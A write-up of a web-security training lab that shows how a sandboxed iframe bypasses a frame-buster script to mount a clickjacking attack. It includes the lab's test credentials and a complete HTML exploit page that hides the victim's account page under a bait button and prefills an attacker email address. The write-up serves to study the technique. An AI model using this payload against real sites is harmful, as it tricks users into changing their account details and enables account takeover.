@@ -1,0 +1,59 @@
+ Clickjacking with a frame buster script
+
+**Category**: Clickjacking  
+**Difficulty**: Apprentice  
+
+---
+
+## Overview / What I Learned
+
+This lab demonstrates how to bypass client-side frame buster scripts using the HTML5 `sandbox` attribute. The goal is to perform a clickjacking attack 
+by embedding the target’s account page inside an invisible iframe and tricking the victim into clicking a button that changes their email address.
+
+Key takeaways:
+
+- JavaScript-based frame busters can be bypassed using `<iframe sandbox="allow-forms">`.
+- `sandbox` disables JavaScript in the iframe, effectively neutralizing frame busters.
+- By carefully aligning a transparent iframe over a visible UI element, we can perform a deceptive interaction (UI redressing).
+- Positioning and opacity are crucial in aligning and hiding the iframe behind a bait element.
+
+---
+
+## Exploit Steps / Attack Methodology
+
+### 1. Initial Setup
+
+- Logged in as the test user `wiener:peter`.
+- Navigated to `/my-account` to confirm that changing the email address requires a form submission.
+- Identified the “Update email” button that submits the form.
+
+### 2. Bypassing the Frame Buster
+
+- The page could not be framed due to a JavaScript frame-busting script.
+- Added `sandbox="allow-forms"` to the `<iframe>` element to disable JavaScript while still allowing form submission.
+
+### 3. Crafting the Exploit Page
+
+Used the exploit server to host the following HTML payload:
+
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 385px;
+    left: 80px;
+    z-index: 1;
+  }
+</style>
+
+<div>Click me</div>
+
+<iframe sandbox="allow-forms"
+src="https://labId.web-security-academy.net/my-account?email=attacker@evil.com"></iframe>
